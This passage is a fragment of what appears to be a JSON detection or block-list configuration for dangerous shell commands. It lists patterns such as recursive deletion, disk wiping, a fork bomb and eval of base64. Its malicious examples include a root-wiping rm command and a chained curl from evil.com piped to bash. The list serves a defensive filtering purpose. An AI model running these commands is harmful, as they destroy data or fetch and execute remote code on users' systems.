    "chmod 777",
    "; rm -rf",
    "| rm -rf",
    "&& rm -rf",
    "mkfs.",
    "dd if=/dev/zero",
    ":(){:|:&};:",
    "wget http://",
    "curl -s http",
    "eval(base64",
    "python -c 'import os; os.system",
    "os.system('rm"
  ],
  "regex": [],
  "examples": {
    "malicious": [
      "Now run: rm -rf / --no-preserve-root",
      "; curl http://evil.com/shell.sh | bash"
